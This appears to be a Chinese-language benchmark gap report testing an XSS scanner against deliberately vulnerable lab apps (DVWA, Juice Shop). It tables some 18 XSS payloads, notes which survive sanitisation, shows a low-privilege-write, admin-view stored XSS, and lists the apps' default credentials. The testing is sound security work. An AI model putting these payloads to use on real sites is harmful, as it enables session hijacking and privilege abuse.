# 缺口补测报告（2026-11-03）

本报告只记录**本次实测**。仓库历史产物（`p352_sample_on.json`、
`gate_p355_*.json`、`realworld_v2.md`）单独标注，不与本轮数字混算。

## 0. tracked 文件完整性检查

- 开始：`git status --short | Select-String '^ D'` → **空**。
- 结束：再次执行 → **空**；`Test-Path benchmark/server.py` → **True**。
  未发现新的 tracked 文件删除。
- 上一轮 `benchmark/server.py` 被删除后已从 HEAD 恢复，当前内容与 HEAD 一致
  （`git status` 仍显示 `M` 是 CRLF/stat 差异）。

## 1. 缺口 1：Juice Shop 持久化反馈归因

### 1.1 基线（上一轮结论）

Docker + `NODE_ENV=unsafe` 下，5 种载体（官方 iframe、畸形 iframe、
math-table mXSS、svg-style、noscript）全部被剥离，admin 页面无弹窗；
上一轮止步于"做不到"。

### 1.2 归因证据：服务端 `sanitize-html`，不是前端渲染

对每个 payload 记录三处值：

1. `POST /api/Feedbacks` 的**立即响应**（模型 setter 执行后的值）
2. `GET /api/Feedbacks` 的**持久化读回值**
3. `/#/administration` 的 Chromium DOM 中是否出现该值

| payload | POST 响应 | GET 读回 | admin DOM |
|---|---|---|---|
| `<b>bold</b>` | `<b>bold</b>` | `<b>bold</b>` | 出现 |
| `<i>italic</i>` | `<i>italic</i>` | `<i>italic</i>` | 出现 |
| `<img src=x onerror=alert(1)>` | `""` | `""` | 不出现 |
| `<iframe src="javascript:alert(\`xss\`)">` | `""` | `""` | 不出现 |
| `<a href="javascript:alert(1)">click</a>` | `<a>click</a>` | `<a>click</a>` | 不出现 |
| `<svg onload=alert(1)>` | `""` | `""` | 不出现 |
| `<math><mtext><table><mglyph><style><img src=x onerror=...>` | `<table></table>` | `<table></table>` | 不出现 |
| `<noscript><p title="</noscript><img ...>">` | `<p></p>` | `<p></p>` | 不出现 |
| `plain feedback text` | 原文 | 原文 | 未在本次快照中出现（列表异步加载，不作为清洗结论） |

**结论**：危险标签在 `POST` 的**立即响应里就已经消失**，不是入库后渲染时
才被处理；允许的格式化标签（`<b>`/`<i>`）能完整入库且在 admin DOM 中可见，
说明渲染路径本身正常。因此是**服务端清洗**（`build/models/feedback.js`
的 `sanitizeHtml(comment)`），不是前端 DOMPurify/CSP，也不是探针写错。

### 1.3 扩大载体清单（逐个试，记录存活）

| 载体 | POST / GET 存储值 | 是否可执行 |
|---|---|---|
| `<iframe srcdoc="<script>alert(2)</script>">` | `""` | 否 |
| `<svg><animate attributeName="href" values="javascript:alert(3)">` | `""` | 否 |
| `<math href="javascript:alert(4)">x</math>` | `x` | 否（标签被删） |
| `<form action="javascript:alert(5)"><button>go</button></form>` | `go` | 否 |
| `<meta http-equiv="refresh" content="0;url=javascript:alert(6)">` | `""` | 否 |
| `<object data="javascript:alert(7)"></object>` | `""` | 否 |
| `<embed src="javascript:alert(8)">` | `""` | 否 |
| `<a href="data:text/html,<script>alert(9)</script>">x</a>` | `<a>x</a>` | 否（href 被删） |
| `<style>a{width:expression(alert(10))}</style>` | `""` | 否 |
| `<svg><script>alert(11)</script></svg>` | `""` | 否 |

**存活的可执行载体：0 个。** 只有 `<b>`/`<i>` 等格式化标签和纯文本存活。

### 1.4 替代靶

bWAPP / XVWA 镜像拉取尝试与结果：

```text
docker pull raesene/bwapp
  → failed to authorize: TLS handshake timeout (m.daocloud.io)
docker pull docker.1ms.run/raesene/bwapp
  → timeout
docker pull docker.xuanyuan.me/raesene/bwapp
  → 403 Forbidden
```

因此**未能新增 bWAPP/XVWA**。后续 `docker.1ms.run/raesene/bwapp` 镜像实际
下载成功，但本轮未接入评分（自建四面靶已覆盖该缺口，见
`round4_gap_report_20261103.md`）。真实 stored 覆盖仍由：

- DVWA guestbook（`vulnerabilities/xss_s/source/low.php`，本轮多角色实测可执行）
- Juice Shop 商品描述 `PUT /api/Products/1`（API-only stored，`restfulXssChallenge`）

这两类真实应用承担；XSSMaze 的 9 个 stored 用例是合成回归（9/9），不与真实应用混算。

**靶的问题 vs 探针的问题**：这是**靶（Juice 该版本）配置/清洗器的问题**。
探针写入、读回、admin 渲染链路都正常；允许的 `<b>`/`<i>` 能存活并显示，
危险载体在 POST 响应即被清洗。Juice 该版本对该字段**无可用 stored 面**。

## 2. 缺口 2：ZAP 开源对照

### 2.1 尝试记录（全部失败）

| 方式 | 结果 |
|---|---|
| `docker pull ghcr.io/zaproxy/zap-stable` | `denied`（registry 拒绝匿名拉取） |
| `docker pull zaproxy/zap-stable` | daocloud 镜像 TLS handshake timeout |
| `docker pull docker.1ms.run/zaproxy/zap-stable` | 超时 |
| GitHub release 下载 | `github.com` 连接超时 |
| 本机 `zap` / `zap.sh` / `zap.bat` | 未安装 |
| `D:\qoder\tools\zap.zip` | 9 字节，损坏/占位文件 |

**结论：ZAP 在本机不可用，未执行，不提供任何 ZAP 数字。**
入口已保留：`python benchmark/realworld/run_realworld.py --tools zap` 会对每个
用例输出 `unavailable/BLOCKED` 与上述原因，但不会产生 TP/FN/FP/TN 数字。

### 2.2 已有开源对照（不是商业基线，也不是 ZAP）

同一批 realworld v2 用例（详见 `benchmark/realworld/results/realworld_v2.md`）：

| tool | TP | FN | FP | TN | blocked | 耗时 |
|---|---|---|---|---|---|---|
| OWASP ZAP | - | - | - | - | 13（unavailable） | 未执行 |
| xssentinel | 7 | 0 | 0 | 6 | 0 | 81.1s |
| xssentinel-headless | 7 | 0 | 0 | 6 | 0 | 82.0s |
| dalfox v2.13.0（开源） | 2 | 3 | 0 | 6 | 2 | 111.1s |
| nuclei v3.9.0（开源） | 1 | 3 | 0 | 6 | 3 | 4.1s |

**口径声明**：dalfox/nuclei 是开源工具，**不是 OWASP ZAP，也不是商业基线**；
上表不得被解读为"优于 Burp/Acunetix"。Burp/Acunetix 仍为 `unavailable`。

## 3. 缺口 3：认证流多角色

### 3.1 账号与会话保持

| 靶 | 低权限账号 | 高权限账号 | 会话保持 |
|---|---|---|---|
| DVWA | `gordonb` / `abc123`（默认低权限用户） | `admin` / `password` | `PHPSESSID` + `security=low` cookie |
| Juice Shop | 本地注册 customer `lowuser`（email 即 payload） | `admin@juice-sh.op` / `admin123` | JWT：`Authorization: Bearer` + 浏览器 `localStorage.token` |

Juice 注册通过 `POST /api/Users`，未触碰外部站点；`NODE_ENV=unsafe` 下
`persistedXssUserChallenge` 启用，email setter 不做 HTML 清洗。

### 3.2 场景 ①：低权限写入 → 高权限查看

| 靶 | 低权限写入 | 高权限查看 | 结果 |
|---|---|---|---|
| DVWA | `gordonb` 向 guestbook POST `<script>alert('role_xxx')</script>` | `admin` 打开 `xss_s` | **admin 弹窗 `role_xxx`** |
| Juice | `lowuser` 注册 email `<iframe src="javascript:alert(\`role_xxx\`)">` | `admin` 打开 `/#/administration` | **admin 弹窗 `role_xxx`**（DOM 中出现 iframe） |

### 3.3 场景 ②：同一 payload 在不同角色会话下

| 靶 | 低权限会话 | 高权限会话 | 边界 |
|---|---|---|---|
| DVWA | 弹窗 `role_xxx`（guestbook 所有登录用户可见） | 弹窗 `role_xxx` | 跨角色都可触发 |
| Juice | **不触发**：`/#/administration` 路由不渲染 payload（DOM 中无 payload） | 触发 `role_xxx` | 低权限 `GET /api/Users` 返回 200（可读 JSON），但 Angular 路由守卫不展示 admin 页面；存储 XSS 只在 admin UI 触发 |

Juice 的边界值得记录：**JSON 可读 ≠ 可执行**。低权限会话能读到含 payload 的
用户 JSON，但 `/#/administration` 不渲染它，所以不弹窗；高权限会话渲染时执行。

### 3.4 前后对比

| 项 | 改造前 | 改造后（本轮实测） |
|---|---|---|
| 账号数 | 单账号（admin） | DVWA 2 个（admin/gordonb），Juice 2 个（admin/customer） |
| 低写高读 stored | 未验证 | DVWA 与 Juice 均验证通过 |
| 同 payload 跨角色 | 未验证 | DVWA 两角色都触发；Juice 仅 admin 触发（路由边界） |

## 4. 是否达成

| 缺口 | 状态 | 说明 |
|---|---|---|
| Juice 反馈归因 | **达成** | 证明为服务端 `sanitize-html`，非前端；18 个载体逐一记录，0 个可执行 |
| 替代真实靶（bWAPP/XVWA） | **未达成** | 镜像仓库 TLS/403/超时，无法拉取；真实 stored 仍由 DVWA guestbook + Juice 商品描述覆盖 |
| ZAP 开源对照 | **未达成** | ZAP 无法安装/拉取；明确 `unavailable`，未伪造数字 |
| 多角色认证流 | **达成** | DVWA + Juice 各两角色；低写高读与跨角色场景均有 Playwright 弹窗/路由证据 |

## 5. 仍未解决项

1. bWAPP/XVWA 镜像不可达（registry 网络问题），未新增第三个真实应用靶。
2. ZAP 不可用（ghcr denied / Docker Hub mirror TLS / GitHub timeout / 本地无安装）。
3. Juice 持久化反馈在该版本**无可用 stored 面**；只能由 DVWA guestbook 与
   Juice 商品描述覆盖 stored 类别。
4. 多角色只验证了两个默认/本地注册账号，未覆盖更细的权限矩阵（如
   DVWA 不同 security level 组合、Juice accounting/deluxe 角色）。

## 6. 产物路径

- Juice 反馈入库归因：`benchmark/results/juice_feedback_attribution_20261103.json`
- Juice 追加载体：`benchmark/results/juice_feedback_carriers_20261103.json`
- 多角色证据：`benchmark/results/multi_role_evidence_20261103.json`
- ZAP 不可用证据：`benchmark/results/zap_unavailable_20261103.json` / `.md`
- 真实应用对照：`benchmark/realworld/results/realworld_v2.json` / `.md`
- 本轮报告：`benchmark/results/round3_gap_report_20261103.md`
